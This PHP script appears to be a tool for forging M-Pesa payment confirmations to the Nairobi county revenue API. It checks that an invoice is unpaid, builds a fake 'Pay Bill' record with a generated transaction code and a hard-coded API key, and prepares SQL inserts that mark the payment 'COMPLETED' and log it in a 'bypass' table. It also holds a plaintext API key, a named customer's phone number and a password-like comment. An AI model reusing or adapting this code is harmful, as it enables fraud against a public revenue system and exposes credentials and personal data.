<?php
require 'vendor/autoload.php';

include './includes/core_auto.php';
include './includes/conn_auto.php';
include './includes/conn_pure.php';

$stmt = $conn3->prepare("SELECT * FROM message WHERE status=:status ORDER BY RAND() LIMIT 1");
$stmt->execute(['status' => '0']);
$dt1 = $stmt->fetch();

$dt1 = ['invoiceNo'=>'BL-UBP-064249','invoiceAmt'=>'15000','client'=>0,'id'=>'1'];

$stmt2 = $conn3->prepare("SELECT * FROM clients WHERE id=:id");
$stmt2->execute(['id' => $dt1['client']]);
$dtt1 = $stmt2->fetch();
$dtt1['name'] = '0';

//echo json_encode($dt1);
$url = 'https://nairobiservices.go.ke/api/sbp/applications/get_invoice_details?invoice_no=' . $dt1['invoiceNo'];
$data = [];
$headers = ['Authorization:Bearer ' . tokenizer()['token']];
//echo $invtk;
$validation = json_decode(httpGet($url, $data, $headers), true);

echo json_encode($validation);
die();

if (isset($validation['success'])) {
    if ($validation['success']) {
        if (isset($validation['status'])) {
            if ($validation['status'] == "Unpaid") {
                $parts = explode('-', $dt1['invoiceNo']); // Split the string by hyphen
                $validationAmt = str_replace(",", "", $validation['amount']);
                if ($parts[0] != 'BL' || $parts[1] == 'LR' || (int)$validationAmt == (int)$dt1['invoiceAmt']) {
                    $billAmt = $dt1['invoiceAmt'];
                    $bypass = ['amount' => $dt1['invoiceAmt'], 'invoice_no' => $dt1['invoiceNo'], 'success' => true, 'route' => 'yes', 'record' => 'yes', 'client' => $dtt1['name'], 'extdoc' => $validation['external_doc'], 'custname' => $validation['customername'], 'custcont' => $validation['mobilenumber']];
                    echo json_encode($bypass) . '<br/>';
                    //echo json_encode($dtt1).'<br/>';
                    //echo json_encode($dt1).'<br/>';
                    if (isset($bypass)) {
                        //include './rejuv/conn.php';

                       // $stmt3 = $conn2->prepare("SELECT id, paybillBal FROM mpesaTransactions ORDER BY id DESC LIMIT 1");
                       // $stmt3->execute();
                        //$up = $stmt3->fetch();

                        //$newId = $up['id'] + 2;
                        $newId = 6212481;
                        $newBal = 378760 + 500;
                        $custname = splitName($bypass['custname']);
                        if ($bypass['custcont'] == '' || $bypass['custcont'] == null) {
                            $bypass['custcont'] = '0700000000';
                        }
                        $custcont = normalizePhoneNumber($bypass['custcont']);
                        $timeFormats = getCurrentTimeFormats();
                        $bypassAmt = (float)$bypass['amount'];

                        $bypass['url'] = 'https://nairobiservices.go.ke/api/gateway/taifa/nrs/affirm';

                        //die(json_encode($url));

                        //$url = 'https://nairobiservices.go.ke/api/authentication/bill/confirm_payment';
                        $bty = explode('-', $bypass['invoice_no']);
                        $bty[1] = strtoupper($bty[1]);
                        $code = generateMpesaCode();
                        $data = array(
                            "apiKey" => "216424b0ce94d4682ef240fd67e30daf600be171",
                            "type" => "mpesa",
                            "billNumber" => (string) $bypass['invoice_no'],
                            "billAmount" => $bypassAmt,
                            "phone" => (string) $custcont,
                            "transactionDate" => "",
                            "Field1" => null,
                            "Field2" => null,
                            "Field3" => null,
                            "Field4" => null,
                            "Field5" => null,
                            "bankdetails" => null,
                            "mpesadetails" => array(
                                "BillRefNumber" => (string) $bypass['invoice_no'],
                                "BusinessShortCode" => "6060047",
                                "FirstName" => (string)str_replace("'", '', $custname['first']),
                                "LastName" => (string)str_replace("'", '', $custname['last']),
                                "MSISDN" => "",
                                "MiddleName" => (string)str_replace("'", '', $custname['middle']),
                                "OrgAccountBalance" => "0.00",
                                "ThirdPartyTransID" => "5627760",
                                "TransAmount" => $bypassAmt,
                                "TransID" => (string) $code,
                                "TransTime" => (string)$timeFormats['withoutSeparators'],
                                "TransactionType" => "Pay Bill"
                            )
                        );


                        $data = json_encode($data, JSON_PRESERVE_ZERO_FRACTION);

                       // echo $data;

                        $sqldata = trim(json_encode($data), '"');

                        $headers = [];

                        $sql = "insert into `mpesaTransactions` (`Confirmation Response`, `MpesaValidation`, `PushedComments`, `PushedToReconcile`, `accNo`, `amount`, `apiCode`, `comment`, `cont`, `id`, `logDate`, `mobileno`, `mpesaName`, `paybillBal`, `phone_number`, `receiptNo`, `resultoutput`, `shortCode`, `sid`, `status`, `transactionTime`, `validation Response`) values (NULL, 'COMPLETED', NULL, '0', '" . $bypass['invoice_no'] . "', " . $bypass['amount'] . ", '2dce510f562c9ab7ce24c6fe282b4f099e8e49be', 'Success', NULL, " . $newId . ", '" . $timeFormats['withSeparators'] . "', '" . $custcont . "', '" . str_replace("'", '', $bypass['custname']) . "', " . $newBal . ", '', '" . $code . "', '" . $sqldata . "', '6060047', NULL, 1, '" . $timeFormats['withoutSeparators'] . "', 'SUCCESS >>>>>>STK PUSH ENTRY-----Validated during stk push transaction')";

                        $qry = "insert into `mpesaTransactions`  ( `Confirmation Response`, `MpesaValidation`, `PushedComments`, `PushedToReconcile`, `accNo`, `amount`, `apiCode`, `comment`, `cont`, `logDate`, `mobileno`, `mpesaName`, `paybillBal`, `phone_number`, `receiptNo`, `resultoutput`, `shortCode`, `sid`, `status`, `transactionTime`, `validation Response`, `host_name`, `host_ip`, `remote_id` ) values  ( NULL, 'COMPLETED', NULL, '0', '" . $bypass['invoice_no'] . "', " . $bypass['amount'] . ", '2dce510f562c9ab7ce24c6fe282b4f099e8e49be', 'Pending', NULL, '" . $timeFormats['withSeparators'] . "', '" . $custcont . "', '" . str_replace("'", '', $bypass['custname']) . "', " . $newBal . ", '', '" . $code . "', '" . $sqldata . "', '6060047', NULL, 0, '" . $timeFormats['withoutSeparators'] . "', 'SUCCESS >>>>>>STK PUSH ENTRY-----Validated during stk push transaction', 'fe80::7054:5e55:9d70:83b3%2',  'fe80::7054:5e55:9d70:83b3%2',  '10.197.136.35' )";

                        //echo $sql.'<br/><br/>';
                        /*
                        $stmt3 = $conn2->prepare("insert into `mpesaTransactions` 
                        (
                        `Confirmation Response`,
                         `MpesaValidation`,
                          `PushedComments`,
                           `PushedToReconcile`,
                            `accNo`,
                             `amount`,
                              `apiCode`,
                               `comment`,
                                `cont`,
                                 `id`,
                                  `logDate`,
                                   `mobileno`,
                                    `mpesaName`,
                                     `paybillBal`,
                                      `phone_number`,
                                       `receiptNo`,
                                        `resultoutput`,
                                         `shortCode`,
                                          `sid`,
                                           `status`,
                                            `transactionTime`,
                                             `validation Response`
                                             ) values 
                        (
                        NULL,
                         'COMPLETED',
                          NULL,
                           '0',
                            '" . $bypass['invoice_no'] . "',
                             " . $bypass['amount'] . ",
                              '2dce510f562c9ab7ce24c6fe282b4f099e8e49be',
                               'Success',
                                NULL,
                                 " . $newId . ",
                                  '" . $timeFormats['withSeparators'] . "',
                                   '" . $custcont . "',
                                    '" . str_replace("'", '', $bypass['custname']) . "',
                                     " . $newBal . ",
                                      '',
                                       '" . $code . "',
                                        '" . $sqldata . "',
                                         '6060047',
                                          NULL,
                                           1,
                                            '" . $timeFormats['withoutSeparators'] . "',
                                             'SUCCESS >>>>>>STK PUSH ENTRY-----Validated during stk push transaction'
                                             )");


                                             

                         {"apiKey":"216424b0ce94d4682ef240fd67e30daf600be171","type":"mpesa","billNumber":"BL-UBP-107590","billAmount":41500.0,"phone":"254717528283","transactionDate":"","Field1":null,"Field2":null,"Field3":null,"Field4":null,"Field5":null,"bankdetails":null,"mpesadetails":{"BillRefNumber":"BL-UBP-107590","BusinessShortCode":"6060047","FirstName":"STEPHEN","LastName":"WAWERU","MSISDN":"","MiddleName":"GITAU","OrgAccountBalance":"0.00","ThirdPartyTransID":"5627760","TransAmount":41500.0,"TransID":"SGJ2GY2SFD","TransTime":"20240719051523","TransactionType":"Pay Bill"}}


                      //*/

                      
                       // $stmt3 = $conn2->prepare("insert into `mpesaTransactions` (`Confirmation Response`, `MpesaValidation`, `PushedComments`, `PushedToReconcile`, `accNo`, `amount`, `apiCode`, `comment`, `cont`, `id`, `logDate`, `mobileno`, `mpesaName`, `paybillBal`, `phone_number`, `receiptNo`, `resultoutput`, `shortCode`, `sid`, `status`, `transactionTime`, `validation Response`) values (NULL, 'COMPLETED', NULL, '0', '" . $bypass['invoice_no'] . "', " . $bypass['amount'] . ", '2dce510f562c9ab7ce24c6fe282b4f099e8e49be', 'Success', NULL, " . $newId . ", '" . $timeFormats['withSeparators'] . "', '" . $custcont . "', '" . str_replace("'", '', $bypass['custname']) . "', " . $newBal . ", '', '" . $code . "', '" . $sqldata . "', '6060047', NULL, 1, '" . $timeFormats['withoutSeparators'] . "', 'SUCCESS >>>>>>STK PUSH ENTRY-----Validated during stk push transaction')");
                       // $stmt3 = $conn2->prepare($qry);
                      
                       // $stmt3->execute();

                       //echo $qry;

                        $billType = "";
                        //$dt0 = bypassCode($bypass, $billType, $code);
                       // $dttt1 = json_decode($dt0, true);

                        $dttt1 = [];
                        //$dttt1['err'] = $dt0;
                        //$dttt1['objj'] = $sqldata;
                        //$dttt1 = '';

                        if (is_array($dttt1)) {
                            if (isset($dttt1['success'])) {
                                if ($dttt1['success']) {
                                    if ($bypass['record'] == 'yes') {
                                        $dataToInsert = array(
                                            "invoice_no" => $bypass['invoice_no'],
                                            "amount" => $bypass['amount'],
                                            'client' => $bypass['client'],
                                            'ref' => $code,
                                            'route' => $bypass['route'],
                                            'extdoc' => $bypass['extdoc']
                                            // Add more columns and values as needed
                                        );
                                        $tableName = 'bypass';
                                        // Call the insert method
                                        $stmt = $conn->prepare('INSERT INTO bypass (invoice_no, amount, client, ref, route, extdoc) VALUES (:invoice_no, :amount, :client, :ref, :route, :extdoc)');
                                        $stmt->execute($dataToInsert);
                                        $dttt1['insert_status'] = "Data inserted successfully recorded.";
                                    } else {
                                        $dttt1['insert_status'] = "Data insertion disabled!";
                                    }
                                }
                            }
                        }

                        //W3v~$9oN0q!
                        if (!isset($dttt1['insert_status'])) {
                            $dttt1['insert_status'] = "Data not recorded!";
                        }

                        $dttt1['code'] = $code;
                        $dttt1['amount'] = $bypass['amount'];
                        $dttt1['route'] = $bypass['route'];

                        updater($dt1['id'], $dttt1['insert_status'], $status = '1');

                        //echo json_encode($dttt1) . '<br/><br/>';;
                    }
                } else {
                    $messBody = 'Invoice number ' . $dt1['invoiceNo'] . ' reads ' . $validationAmt . '\n Please confirm';
                    echo $messBody . '<br/>';
                    send_message($dtt1['contact'], $messBody, $dt1['messageId']);
                    updater($dt1['id'], $messBody, $status = '2');
                }
            } else {
                $messBody = 'Invoice number ' . $dt1['invoiceNo'] . ' already paid';
                echo $messBody . '<br/>';
                send_message($dtt1['contact'], $messBody, $dt1['messageId']);
                updater($dt1['id'], $messBody, $status = '2');
            }
        } else {
            //message admin 
            $messBody = 'Invoice number ' . $dt1['invoiceNo'] . ' validation 2 error: STATUS key unavailable';
            echo $messBody . '<br/>';
            //echo json_encode($validation).'<br/>';
            send_message('254716912663', $messBody);
            updater($dt1['id'], $messBody, $status = '2');
        }
    } else {
        $messBody = 'Invalid invoice number ' . $dt1['invoiceNo'];
        echo $messBody . '<br/>';
        send_message($dtt1['contact'], $messBody, $dt1['messageId']);
        updater($dt1['id'], $messBody, $status = '2');
    }
} else {
    //message admin
    $messBody = 'Invoice number ' . $dt1['invoiceNo'] . ' validation 2 error ';
    echo $messBody . '<br/>';
    send_message('254716912663', $messBody);
    updater($dt1['id'], $messBody, $status = '2');
}
//*/